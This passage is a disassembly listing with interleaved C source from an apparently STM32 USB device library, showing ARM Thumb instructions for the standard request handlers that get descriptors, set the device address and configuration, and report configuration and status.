 800bef6:	4798      	blx	r3
 800bef8:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800befa:	e029      	b.n	800bf50 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800befc:	6839      	ldr	r1, [r7, #0]
 800befe:	6878      	ldr	r0, [r7, #4]
 800bf00:	f000 fa63 	bl	800c3ca <USBD_CtlError>
            err++;
 800bf04:	7afb      	ldrb	r3, [r7, #11]
 800bf06:	3301      	adds	r3, #1
 800bf08:	72fb      	strb	r3, [r7, #11]
          break;
 800bf0a:	e021      	b.n	800bf50 <USBD_GetDescriptor+0x268>

        case USBD_IDX_INTERFACE_STR:
          if (pdev->pDesc->GetInterfaceStrDescriptor != NULL)
 800bf0c:	687b      	ldr	r3, [r7, #4]
 800bf0e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bf12:	699b      	ldr	r3, [r3, #24]
 800bf14:	2b00      	cmp	r3, #0
 800bf16:	d00b      	beq.n	800bf30 <USBD_GetDescriptor+0x248>
          {
            pbuf = pdev->pDesc->GetInterfaceStrDescriptor(pdev->dev_speed, &len);
 800bf18:	687b      	ldr	r3, [r7, #4]
 800bf1a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bf1e:	699b      	ldr	r3, [r3, #24]
 800bf20:	687a      	ldr	r2, [r7, #4]
 800bf22:	7c12      	ldrb	r2, [r2, #16]
 800bf24:	f107 0108 	add.w	r1, r7, #8
 800bf28:	4610      	mov	r0, r2
 800bf2a:	4798      	blx	r3
 800bf2c:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bf2e:	e00f      	b.n	800bf50 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bf30:	6839      	ldr	r1, [r7, #0]
 800bf32:	6878      	ldr	r0, [r7, #4]
 800bf34:	f000 fa49 	bl	800c3ca <USBD_CtlError>
            err++;
 800bf38:	7afb      	ldrb	r3, [r7, #11]
 800bf3a:	3301      	adds	r3, #1
 800bf3c:	72fb      	strb	r3, [r7, #11]
          break;
 800bf3e:	e007      	b.n	800bf50 <USBD_GetDescriptor+0x268>
            err++;
          }
#endif /* USBD_SUPPORT_USER_STRING_DESC  */

#if ((USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U))
          USBD_CtlError(pdev, req);
 800bf40:	6839      	ldr	r1, [r7, #0]
 800bf42:	6878      	ldr	r0, [r7, #4]
 800bf44:	f000 fa41 	bl	800c3ca <USBD_CtlError>
          err++;
 800bf48:	7afb      	ldrb	r3, [r7, #11]
 800bf4a:	3301      	adds	r3, #1
 800bf4c:	72fb      	strb	r3, [r7, #11]
#endif /* (USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U) */
          break;
 800bf4e:	bf00      	nop
      }
      break;
 800bf50:	e037      	b.n	800bfc2 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_DEVICE_QUALIFIER:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bf52:	687b      	ldr	r3, [r7, #4]
 800bf54:	7c1b      	ldrb	r3, [r3, #16]
 800bf56:	2b00      	cmp	r3, #0
 800bf58:	d109      	bne.n	800bf6e <USBD_GetDescriptor+0x286>
          pbuf = (uint8_t *)USBD_CMPSIT.GetDeviceQualifierDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetDeviceQualifierDescriptor(&len);
 800bf5a:	687b      	ldr	r3, [r7, #4]
 800bf5c:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bf60:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800bf62:	f107 0208 	add.w	r2, r7, #8
 800bf66:	4610      	mov	r0, r2
 800bf68:	4798      	blx	r3
 800bf6a:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bf6c:	e029      	b.n	800bfc2 <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bf6e:	6839      	ldr	r1, [r7, #0]
 800bf70:	6878      	ldr	r0, [r7, #4]
 800bf72:	f000 fa2a 	bl	800c3ca <USBD_CtlError>
        err++;
 800bf76:	7afb      	ldrb	r3, [r7, #11]
 800bf78:	3301      	adds	r3, #1
 800bf7a:	72fb      	strb	r3, [r7, #11]
      break;
 800bf7c:	e021      	b.n	800bfc2 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bf7e:	687b      	ldr	r3, [r7, #4]
 800bf80:	7c1b      	ldrb	r3, [r3, #16]
 800bf82:	2b00      	cmp	r3, #0
 800bf84:	d10d      	bne.n	800bfa2 <USBD_GetDescriptor+0x2ba>
          pbuf = (uint8_t *)USBD_CMPSIT.GetOtherSpeedConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetOtherSpeedConfigDescriptor(&len);
 800bf86:	687b      	ldr	r3, [r7, #4]
 800bf88:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bf8c:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 800bf8e:	f107 0208 	add.w	r2, r7, #8
 800bf92:	4610      	mov	r0, r2
 800bf94:	4798      	blx	r3
 800bf96:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION;
 800bf98:	68fb      	ldr	r3, [r7, #12]
 800bf9a:	3301      	adds	r3, #1
 800bf9c:	2207      	movs	r2, #7
 800bf9e:	701a      	strb	r2, [r3, #0]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bfa0:	e00f      	b.n	800bfc2 <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bfa2:	6839      	ldr	r1, [r7, #0]
 800bfa4:	6878      	ldr	r0, [r7, #4]
 800bfa6:	f000 fa10 	bl	800c3ca <USBD_CtlError>
        err++;
 800bfaa:	7afb      	ldrb	r3, [r7, #11]
 800bfac:	3301      	adds	r3, #1
 800bfae:	72fb      	strb	r3, [r7, #11]
      break;
 800bfb0:	e007      	b.n	800bfc2 <USBD_GetDescriptor+0x2da>

    default:
      USBD_CtlError(pdev, req);
 800bfb2:	6839      	ldr	r1, [r7, #0]
 800bfb4:	6878      	ldr	r0, [r7, #4]
 800bfb6:	f000 fa08 	bl	800c3ca <USBD_CtlError>
      err++;
 800bfba:	7afb      	ldrb	r3, [r7, #11]
 800bfbc:	3301      	adds	r3, #1
 800bfbe:	72fb      	strb	r3, [r7, #11]
      break;
 800bfc0:	bf00      	nop
  }

  if (err != 0U)
 800bfc2:	7afb      	ldrb	r3, [r7, #11]
 800bfc4:	2b00      	cmp	r3, #0
 800bfc6:	d11e      	bne.n	800c006 <USBD_GetDescriptor+0x31e>
  {
    return;
  }

  if (req->wLength != 0U)
 800bfc8:	683b      	ldr	r3, [r7, #0]
 800bfca:	88db      	ldrh	r3, [r3, #6]
 800bfcc:	2b00      	cmp	r3, #0
 800bfce:	d016      	beq.n	800bffe <USBD_GetDescriptor+0x316>
  {
    if (len != 0U)
 800bfd0:	893b      	ldrh	r3, [r7, #8]
 800bfd2:	2b00      	cmp	r3, #0
 800bfd4:	d00e      	beq.n	800bff4 <USBD_GetDescriptor+0x30c>
    {
      len = MIN(len, req->wLength);
 800bfd6:	683b      	ldr	r3, [r7, #0]
 800bfd8:	88da      	ldrh	r2, [r3, #6]
 800bfda:	893b      	ldrh	r3, [r7, #8]
 800bfdc:	4293      	cmp	r3, r2
 800bfde:	bf28      	it	cs
 800bfe0:	4613      	movcs	r3, r2
 800bfe2:	b29b      	uxth	r3, r3
 800bfe4:	813b      	strh	r3, [r7, #8]
      (void)USBD_CtlSendData(pdev, pbuf, len);
 800bfe6:	893b      	ldrh	r3, [r7, #8]
 800bfe8:	461a      	mov	r2, r3
 800bfea:	68f9      	ldr	r1, [r7, #12]
 800bfec:	6878      	ldr	r0, [r7, #4]
 800bfee:	f000 fa5d 	bl	800c4ac <USBD_CtlSendData>
 800bff2:	e009      	b.n	800c008 <USBD_GetDescriptor+0x320>
    }
    else
    {
      USBD_CtlError(pdev, req);
 800bff4:	6839      	ldr	r1, [r7, #0]
 800bff6:	6878      	ldr	r0, [r7, #4]
 800bff8:	f000 f9e7 	bl	800c3ca <USBD_CtlError>
 800bffc:	e004      	b.n	800c008 <USBD_GetDescriptor+0x320>
    }
  }
  else
  {
    (void)USBD_CtlSendStatus(pdev);
 800bffe:	6878      	ldr	r0, [r7, #4]
 800c000:	f000 faae 	bl	800c560 <USBD_CtlSendStatus>
 800c004:	e000      	b.n	800c008 <USBD_GetDescriptor+0x320>
    return;
 800c006:	bf00      	nop
  }
}
 800c008:	3710      	adds	r7, #16
 800c00a:	46bd      	mov	sp, r7
 800c00c:	bd80      	pop	{r7, pc}
 800c00e:	bf00      	nop

0800c010 <USBD_SetAddress>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetAddress(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c010:	b580      	push	{r7, lr}
 800c012:	b084      	sub	sp, #16
 800c014:	af00      	add	r7, sp, #0
 800c016:	6078      	str	r0, [r7, #4]
 800c018:	6039      	str	r1, [r7, #0]
  uint8_t  dev_addr;

  if ((req->wIndex == 0U) && (req->wLength == 0U) && (req->wValue < 128U))
 800c01a:	683b      	ldr	r3, [r7, #0]
 800c01c:	889b      	ldrh	r3, [r3, #4]
 800c01e:	2b00      	cmp	r3, #0
 800c020:	d131      	bne.n	800c086 <USBD_SetAddress+0x76>
 800c022:	683b      	ldr	r3, [r7, #0]
 800c024:	88db      	ldrh	r3, [r3, #6]
 800c026:	2b00      	cmp	r3, #0
 800c028:	d12d      	bne.n	800c086 <USBD_SetAddress+0x76>
 800c02a:	683b      	ldr	r3, [r7, #0]
 800c02c:	885b      	ldrh	r3, [r3, #2]
 800c02e:	2b7f      	cmp	r3, #127	; 0x7f
 800c030:	d829      	bhi.n	800c086 <USBD_SetAddress+0x76>
  {
    dev_addr = (uint8_t)(req->wValue) & 0x7FU;
 800c032:	683b      	ldr	r3, [r7, #0]
 800c034:	885b      	ldrh	r3, [r3, #2]
 800c036:	b2db      	uxtb	r3, r3
 800c038:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800c03c:	73fb      	strb	r3, [r7, #15]

    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800c03e:	687b      	ldr	r3, [r7, #4]
 800c040:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c044:	b2db      	uxtb	r3, r3
 800c046:	2b03      	cmp	r3, #3
 800c048:	d104      	bne.n	800c054 <USBD_SetAddress+0x44>
    {
      USBD_CtlError(pdev, req);
 800c04a:	6839      	ldr	r1, [r7, #0]
 800c04c:	6878      	ldr	r0, [r7, #4]
 800c04e:	f000 f9bc 	bl	800c3ca <USBD_CtlError>
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800c052:	e01d      	b.n	800c090 <USBD_SetAddress+0x80>
    }
    else
    {
      pdev->dev_address = dev_addr;
 800c054:	687b      	ldr	r3, [r7, #4]
 800c056:	7bfa      	ldrb	r2, [r7, #15]
 800c058:	f883 229e 	strb.w	r2, [r3, #670]	; 0x29e
      (void)USBD_LL_SetUSBAddress(pdev, dev_addr);
 800c05c:	7bfb      	ldrb	r3, [r7, #15]
 800c05e:	4619      	mov	r1, r3
 800c060:	6878      	ldr	r0, [r7, #4]
 800c062:	f000 ffbf 	bl	800cfe4 <USBD_LL_SetUSBAddress>
      (void)USBD_CtlSendStatus(pdev);
 800c066:	6878      	ldr	r0, [r7, #4]
 800c068:	f000 fa7a 	bl	800c560 <USBD_CtlSendStatus>

      if (dev_addr != 0U)
 800c06c:	7bfb      	ldrb	r3, [r7, #15]
 800c06e:	2b00      	cmp	r3, #0
 800c070:	d004      	beq.n	800c07c <USBD_SetAddress+0x6c>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800c072:	687b      	ldr	r3, [r7, #4]
 800c074:	2202      	movs	r2, #2
 800c076:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800c07a:	e009      	b.n	800c090 <USBD_SetAddress+0x80>
      }
      else
      {
        pdev->dev_state = USBD_STATE_DEFAULT;
 800c07c:	687b      	ldr	r3, [r7, #4]
 800c07e:	2201      	movs	r2, #1
 800c080:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800c084:	e004      	b.n	800c090 <USBD_SetAddress+0x80>
      }
    }
  }
  else
  {
    USBD_CtlError(pdev, req);
 800c086:	6839      	ldr	r1, [r7, #0]
 800c088:	6878      	ldr	r0, [r7, #4]
 800c08a:	f000 f99e 	bl	800c3ca <USBD_CtlError>
  }
}
 800c08e:	bf00      	nop
 800c090:	bf00      	nop
 800c092:	3710      	adds	r7, #16
 800c094:	46bd      	mov	sp, r7
 800c096:	bd80      	pop	{r7, pc}

0800c098 <USBD_SetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static USBD_StatusTypeDef USBD_SetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c098:	b580      	push	{r7, lr}
 800c09a:	b084      	sub	sp, #16
 800c09c:	af00      	add	r7, sp, #0
 800c09e:	6078      	str	r0, [r7, #4]
 800c0a0:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800c0a2:	2300      	movs	r3, #0
 800c0a4:	73fb      	strb	r3, [r7, #15]
  static uint8_t cfgidx;

  cfgidx = (uint8_t)(req->wValue);
 800c0a6:	683b      	ldr	r3, [r7, #0]
 800c0a8:	885b      	ldrh	r3, [r3, #2]
 800c0aa:	b2da      	uxtb	r2, r3
 800c0ac:	4b4e      	ldr	r3, [pc, #312]	; (800c1e8 <USBD_SetConfig+0x150>)
 800c0ae:	701a      	strb	r2, [r3, #0]

  if (cfgidx > USBD_MAX_NUM_CONFIGURATION)
 800c0b0:	4b4d      	ldr	r3, [pc, #308]	; (800c1e8 <USBD_SetConfig+0x150>)
 800c0b2:	781b      	ldrb	r3, [r3, #0]
 800c0b4:	2b01      	cmp	r3, #1
 800c0b6:	d905      	bls.n	800c0c4 <USBD_SetConfig+0x2c>
  {
    USBD_CtlError(pdev, req);
 800c0b8:	6839      	ldr	r1, [r7, #0]
 800c0ba:	6878      	ldr	r0, [r7, #4]
 800c0bc:	f000 f985 	bl	800c3ca <USBD_CtlError>
    return USBD_FAIL;
 800c0c0:	2303      	movs	r3, #3
 800c0c2:	e08c      	b.n	800c1de <USBD_SetConfig+0x146>
  }

  switch (pdev->dev_state)
 800c0c4:	687b      	ldr	r3, [r7, #4]
 800c0c6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c0ca:	b2db      	uxtb	r3, r3
 800c0cc:	2b02      	cmp	r3, #2
 800c0ce:	d002      	beq.n	800c0d6 <USBD_SetConfig+0x3e>
 800c0d0:	2b03      	cmp	r3, #3
 800c0d2:	d029      	beq.n	800c128 <USBD_SetConfig+0x90>
 800c0d4:	e075      	b.n	800c1c2 <USBD_SetConfig+0x12a>
  {
    case USBD_STATE_ADDRESSED:
      if (cfgidx != 0U)
 800c0d6:	4b44      	ldr	r3, [pc, #272]	; (800c1e8 <USBD_SetConfig+0x150>)
 800c0d8:	781b      	ldrb	r3, [r3, #0]
 800c0da:	2b00      	cmp	r3, #0
 800c0dc:	d020      	beq.n	800c120 <USBD_SetConfig+0x88>
      {
        pdev->dev_config = cfgidx;
 800c0de:	4b42      	ldr	r3, [pc, #264]	; (800c1e8 <USBD_SetConfig+0x150>)
 800c0e0:	781b      	ldrb	r3, [r3, #0]
 800c0e2:	461a      	mov	r2, r3
 800c0e4:	687b      	ldr	r3, [r7, #4]
 800c0e6:	605a      	str	r2, [r3, #4]

        ret = USBD_SetClassConfig(pdev, cfgidx);
 800c0e8:	4b3f      	ldr	r3, [pc, #252]	; (800c1e8 <USBD_SetConfig+0x150>)
 800c0ea:	781b      	ldrb	r3, [r3, #0]
 800c0ec:	4619      	mov	r1, r3
 800c0ee:	6878      	ldr	r0, [r7, #4]
 800c0f0:	f7ff f848 	bl	800b184 <USBD_SetClassConfig>
 800c0f4:	4603      	mov	r3, r0
 800c0f6:	73fb      	strb	r3, [r7, #15]

        if (ret != USBD_OK)
 800c0f8:	7bfb      	ldrb	r3, [r7, #15]
 800c0fa:	2b00      	cmp	r3, #0
 800c0fc:	d008      	beq.n	800c110 <USBD_SetConfig+0x78>
        {
          USBD_CtlError(pdev, req);
 800c0fe:	6839      	ldr	r1, [r7, #0]
 800c100:	6878      	ldr	r0, [r7, #4]
 800c102:	f000 f962 	bl	800c3ca <USBD_CtlError>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800c106:	687b      	ldr	r3, [r7, #4]
 800c108:	2202      	movs	r2, #2
 800c10a:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800c10e:	e065      	b.n	800c1dc <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800c110:	6878      	ldr	r0, [r7, #4]
 800c112:	f000 fa25 	bl	800c560 <USBD_CtlSendStatus>
          pdev->dev_state = USBD_STATE_CONFIGURED;
 800c116:	687b      	ldr	r3, [r7, #4]
 800c118:	2203      	movs	r2, #3
 800c11a:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800c11e:	e05d      	b.n	800c1dc <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800c120:	6878      	ldr	r0, [r7, #4]
 800c122:	f000 fa1d 	bl	800c560 <USBD_CtlSendStatus>
      break;
 800c126:	e059      	b.n	800c1dc <USBD_SetConfig+0x144>

    case USBD_STATE_CONFIGURED:
      if (cfgidx == 0U)
 800c128:	4b2f      	ldr	r3, [pc, #188]	; (800c1e8 <USBD_SetConfig+0x150>)
 800c12a:	781b      	ldrb	r3, [r3, #0]
 800c12c:	2b00      	cmp	r3, #0
 800c12e:	d112      	bne.n	800c156 <USBD_SetConfig+0xbe>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800c130:	687b      	ldr	r3, [r7, #4]
 800c132:	2202      	movs	r2, #2
 800c134:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
        pdev->dev_config = cfgidx;
 800c138:	4b2b      	ldr	r3, [pc, #172]	; (800c1e8 <USBD_SetConfig+0x150>)
 800c13a:	781b      	ldrb	r3, [r3, #0]
 800c13c:	461a      	mov	r2, r3
 800c13e:	687b      	ldr	r3, [r7, #4]
 800c140:	605a      	str	r2, [r3, #4]
        (void)USBD_ClrClassConfig(pdev, cfgidx);
 800c142:	4b29      	ldr	r3, [pc, #164]	; (800c1e8 <USBD_SetConfig+0x150>)
 800c144:	781b      	ldrb	r3, [r3, #0]
 800c146:	4619      	mov	r1, r3
 800c148:	6878      	ldr	r0, [r7, #4]
 800c14a:	f7ff f837 	bl	800b1bc <USBD_ClrClassConfig>
        (void)USBD_CtlSendStatus(pdev);
 800c14e:	6878      	ldr	r0, [r7, #4]
 800c150:	f000 fa06 	bl	800c560 <USBD_CtlSendStatus>
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800c154:	e042      	b.n	800c1dc <USBD_SetConfig+0x144>
      else if (cfgidx != pdev->dev_config)
 800c156:	4b24      	ldr	r3, [pc, #144]	; (800c1e8 <USBD_SetConfig+0x150>)
 800c158:	781b      	ldrb	r3, [r3, #0]
 800c15a:	461a      	mov	r2, r3
 800c15c:	687b      	ldr	r3, [r7, #4]
 800c15e:	685b      	ldr	r3, [r3, #4]
 800c160:	429a      	cmp	r2, r3
 800c162:	d02a      	beq.n	800c1ba <USBD_SetConfig+0x122>
        (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800c164:	687b      	ldr	r3, [r7, #4]
 800c166:	685b      	ldr	r3, [r3, #4]
 800c168:	b2db      	uxtb	r3, r3
 800c16a:	4619      	mov	r1, r3
 800c16c:	6878      	ldr	r0, [r7, #4]
 800c16e:	f7ff f825 	bl	800b1bc <USBD_ClrClassConfig>
        pdev->dev_config = cfgidx;
 800c172:	4b1d      	ldr	r3, [pc, #116]	; (800c1e8 <USBD_SetConfig+0x150>)
 800c174:	781b      	ldrb	r3, [r3, #0]
 800c176:	461a      	mov	r2, r3
 800c178:	687b      	ldr	r3, [r7, #4]
 800c17a:	605a      	str	r2, [r3, #4]
        ret = USBD_SetClassConfig(pdev, cfgidx);
 800c17c:	4b1a      	ldr	r3, [pc, #104]	; (800c1e8 <USBD_SetConfig+0x150>)
 800c17e:	781b      	ldrb	r3, [r3, #0]
 800c180:	4619      	mov	r1, r3
 800c182:	6878      	ldr	r0, [r7, #4]
 800c184:	f7fe fffe 	bl	800b184 <USBD_SetClassConfig>
 800c188:	4603      	mov	r3, r0
 800c18a:	73fb      	strb	r3, [r7, #15]
        if (ret != USBD_OK)
 800c18c:	7bfb      	ldrb	r3, [r7, #15]
 800c18e:	2b00      	cmp	r3, #0
 800c190:	d00f      	beq.n	800c1b2 <USBD_SetConfig+0x11a>
          USBD_CtlError(pdev, req);
 800c192:	6839      	ldr	r1, [r7, #0]
 800c194:	6878      	ldr	r0, [r7, #4]
 800c196:	f000 f918 	bl	800c3ca <USBD_CtlError>
          (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800c19a:	687b      	ldr	r3, [r7, #4]
 800c19c:	685b      	ldr	r3, [r3, #4]
 800c19e:	b2db      	uxtb	r3, r3
 800c1a0:	4619      	mov	r1, r3
 800c1a2:	6878      	ldr	r0, [r7, #4]
 800c1a4:	f7ff f80a 	bl	800b1bc <USBD_ClrClassConfig>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800c1a8:	687b      	ldr	r3, [r7, #4]
 800c1aa:	2202      	movs	r2, #2
 800c1ac:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800c1b0:	e014      	b.n	800c1dc <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800c1b2:	6878      	ldr	r0, [r7, #4]
 800c1b4:	f000 f9d4 	bl	800c560 <USBD_CtlSendStatus>
      break;
 800c1b8:	e010      	b.n	800c1dc <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800c1ba:	6878      	ldr	r0, [r7, #4]
 800c1bc:	f000 f9d0 	bl	800c560 <USBD_CtlSendStatus>
      break;
 800c1c0:	e00c      	b.n	800c1dc <USBD_SetConfig+0x144>

    default:
      USBD_CtlError(pdev, req);
 800c1c2:	6839      	ldr	r1, [r7, #0]
 800c1c4:	6878      	ldr	r0, [r7, #4]
 800c1c6:	f000 f900 	bl	800c3ca <USBD_CtlError>
      (void)USBD_ClrClassConfig(pdev, cfgidx);
 800c1ca:	4b07      	ldr	r3, [pc, #28]	; (800c1e8 <USBD_SetConfig+0x150>)
 800c1cc:	781b      	ldrb	r3, [r3, #0]
 800c1ce:	4619      	mov	r1, r3
 800c1d0:	6878      	ldr	r0, [r7, #4]
 800c1d2:	f7fe fff3 	bl	800b1bc <USBD_ClrClassConfig>
      ret = USBD_FAIL;
 800c1d6:	2303      	movs	r3, #3
 800c1d8:	73fb      	strb	r3, [r7, #15]
      break;
 800c1da:	bf00      	nop
  }

  return ret;
 800c1dc:	7bfb      	ldrb	r3, [r7, #15]
}
 800c1de:	4618      	mov	r0, r3
 800c1e0:	3710      	adds	r7, #16
 800c1e2:	46bd      	mov	sp, r7
 800c1e4:	bd80      	pop	{r7, pc}
 800c1e6:	bf00      	nop
 800c1e8:	200003bc 	.word	0x200003bc

0800c1ec <USBD_GetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c1ec:	b580      	push	{r7, lr}
 800c1ee:	b082      	sub	sp, #8
 800c1f0:	af00      	add	r7, sp, #0
 800c1f2:	6078      	str	r0, [r7, #4]
 800c1f4:	6039      	str	r1, [r7, #0]
  if (req->wLength != 1U)
 800c1f6:	683b      	ldr	r3, [r7, #0]
 800c1f8:	88db      	ldrh	r3, [r3, #6]
 800c1fa:	2b01      	cmp	r3, #1
 800c1fc:	d004      	beq.n	800c208 <USBD_GetConfig+0x1c>
  {
    USBD_CtlError(pdev, req);
 800c1fe:	6839      	ldr	r1, [r7, #0]
 800c200:	6878      	ldr	r0, [r7, #4]
 800c202:	f000 f8e2 	bl	800c3ca <USBD_CtlError>
      default:
        USBD_CtlError(pdev, req);
        break;
    }
  }
}
 800c206:	e023      	b.n	800c250 <USBD_GetConfig+0x64>
    switch (pdev->dev_state)
 800c208:	687b      	ldr	r3, [r7, #4]
 800c20a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c20e:	b2db      	uxtb	r3, r3
 800c210:	2b02      	cmp	r3, #2
 800c212:	dc02      	bgt.n	800c21a <USBD_GetConfig+0x2e>
 800c214:	2b00      	cmp	r3, #0
 800c216:	dc03      	bgt.n	800c220 <USBD_GetConfig+0x34>
 800c218:	e015      	b.n	800c246 <USBD_GetConfig+0x5a>
 800c21a:	2b03      	cmp	r3, #3
 800c21c:	d00b      	beq.n	800c236 <USBD_GetConfig+0x4a>
 800c21e:	e012      	b.n	800c246 <USBD_GetConfig+0x5a>
        pdev->dev_default_config = 0U;
 800c220:	687b      	ldr	r3, [r7, #4]
 800c222:	2200      	movs	r2, #0
 800c224:	609a      	str	r2, [r3, #8]
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_default_config, 1U);
 800c226:	687b      	ldr	r3, [r7, #4]
 800c228:	3308      	adds	r3, #8
 800c22a:	2201      	movs	r2, #1
 800c22c:	4619      	mov	r1, r3
 800c22e:	6878      	ldr	r0, [r7, #4]
 800c230:	f000 f93c 	bl	800c4ac <USBD_CtlSendData>
        break;
 800c234:	e00c      	b.n	800c250 <USBD_GetConfig+0x64>
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config, 1U);
 800c236:	687b      	ldr	r3, [r7, #4]
 800c238:	3304      	adds	r3, #4
 800c23a:	2201      	movs	r2, #1
 800c23c:	4619      	mov	r1, r3
 800c23e:	6878      	ldr	r0, [r7, #4]
 800c240:	f000 f934 	bl	800c4ac <USBD_CtlSendData>
        break;
 800c244:	e004      	b.n	800c250 <USBD_GetConfig+0x64>
        USBD_CtlError(pdev, req);
 800c246:	6839      	ldr	r1, [r7, #0]
 800c248:	6878      	ldr	r0, [r7, #4]
 800c24a:	f000 f8be 	bl	800c3ca <USBD_CtlError>
        break;
 800c24e:	bf00      	nop
}
 800c250:	bf00      	nop
 800c252:	3708      	adds	r7, #8
 800c254:	46bd      	mov	sp, r7
 800c256:	bd80      	pop	{r7, pc}

0800c258 <USBD_GetStatus>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetStatus(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c258:	b580      	push	{r7, lr}
 800c25a:	b082      	sub	sp, #8
 800c25c:	af00      	add	r7, sp, #0
 800c25e:	6078      	str	r0, [r7, #4]
 800c260:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c262:	687b      	ldr	r3, [r7, #4]
 800c264:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c268:	b2db      	uxtb	r3, r3
 800c26a:	3b01      	subs	r3, #1
 800c26c:	2b02      	cmp	r3, #2
 800c26e:	d81e      	bhi.n	800c2ae <USBD_GetStatus+0x56>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wLength != 0x2U)
 800c270:	683b      	ldr	r3, [r7, #0]
 800c272:	88db      	ldrh	r3, [r3, #6]
 800c274:	2b02      	cmp	r3, #2
 800c276:	d004      	beq.n	800c282 <USBD_GetStatus+0x2a>
      {
        USBD_CtlError(pdev, req);
 800c278:	6839      	ldr	r1, [r7, #0]
 800c27a:	6878      	ldr	r0, [r7, #4]
 800c27c:	f000 f8a5 	bl	800c3ca <USBD_CtlError>
        break;
 800c280:	e01a      	b.n	800c2b8 <USBD_GetStatus+0x60>
      }

#if (USBD_SELF_POWERED == 1U)
      pdev->dev_config_status = USB_CONFIG_SELF_POWERED;
 800c282:	687b      	ldr	r3, [r7, #4]
 800c284:	2201      	movs	r2, #1
 800c286:	60da      	str	r2, [r3, #12]
#else
      pdev->dev_config_status = 0U;
#endif /* USBD_SELF_POWERED */

      if (pdev->dev_remote_wakeup != 0U)
 800c288:	687b      	ldr	r3, [r7, #4]
 800c28a:	f8d3 32a4 	ldr.w	r3, [r3, #676]	; 0x2a4
 800c28e:	2b00      	cmp	r3, #0
 800c290:	d005      	beq.n	800c29e <USBD_GetStatus+0x46>
      {
        pdev->dev_config_status |= USB_CONFIG_REMOTE_WAKEUP;
 800c292:	687b      	ldr	r3, [r7, #4]
 800c294:	68db      	ldr	r3, [r3, #12]
 800c296:	f043 0202 	orr.w	r2, r3, #2
 800c29a:	687b      	ldr	r3, [r7, #4]
 800c29c:	60da      	str	r2, [r3, #12]
      }

